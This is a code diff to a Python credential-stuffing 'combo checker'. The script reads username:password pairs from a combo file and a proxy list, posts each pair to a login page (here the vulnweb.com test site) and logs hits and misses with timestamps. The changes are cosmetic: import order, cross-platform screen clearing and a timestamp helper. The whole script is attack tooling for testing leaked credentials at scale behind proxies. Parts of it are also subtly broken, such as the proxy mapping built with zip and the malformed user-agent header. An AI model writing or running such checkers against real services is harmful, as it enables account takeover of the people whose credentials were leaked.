@@ -1,16 +1,14 @@
-import requests
 from colorama import Fore,Style
-import os
-import random
 from easygui import fileopenbox
 from datetime import datetime
+import requests
 import ctypes
+import random
+import time
+import os
 
 bad = 0
 good = 0
-
-
-
 
 e = fileopenbox(default = '*.txt', title = "Select Combo File")
 r = open(e, "r", errors="ignore").read().split("\n")
@@ -22,12 +20,15 @@ proxies = [x.strip() for x in r if x != '']
 
 pr = dict(zip("https://", proxies))
 
-os.system('cls')
+os.system('cls' if os.name == 'nt' else 'clear')
 
 api = 'http://testphp.vulnweb.com/userinfo.php'
 
-now = datetime.now()
-dt_string = now.strftime("%H:%M:%S")
+def tstamp():
+    timestamp = time.time()
+    date_time = datetime.fromtimestamp(timestamp)
+    ts = str(date_time.strftime("%H:%M:%S"))
+    return ts
 
 for combo in combolist:
     seq = combo.strip()
@@ -37,8 +38,6 @@ for combo in combolist:
     password = acc [1]
     account = username + ':' + password
     
-
-
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36 Pragma: no-cacheAccept: */*",
@@ -50,8 +49,8 @@ for combo in combolist:
     ctypes.windll.kernel32.SetConsoleTitleW(f"Test Checker Good:- {good} | Bad:- {bad}")
 
     if "On this page you can visualize" in req:
-        print(f"{Style.BRIGHT}{Fore.CYAN}{dt_string} - {Fore.GREEN}[Hit]{Fore.CYAN} - {Fore.GREEN}" + account)
+        print(f"{Style.BRIGHT}{Fore.CYAN}{tstamp()} - {Fore.GREEN}[Hit]{Fore.CYAN} - {Fore.GREEN}" + account)
         good += 1
     if "username" in req:
         bad += 1
-        print(f"{Style.BRIGHT}{Fore.CYAN}{dt_string} - {Fore.RED}[BAD]{Fore.CYAN} - {Fore.RED}" + account)
+        print(f"{Style.BRIGHT}{Fore.CYAN}{tstamp()} - {Fore.RED}[BAD]{Fore.CYAN} - {Fore.RED}" + account)
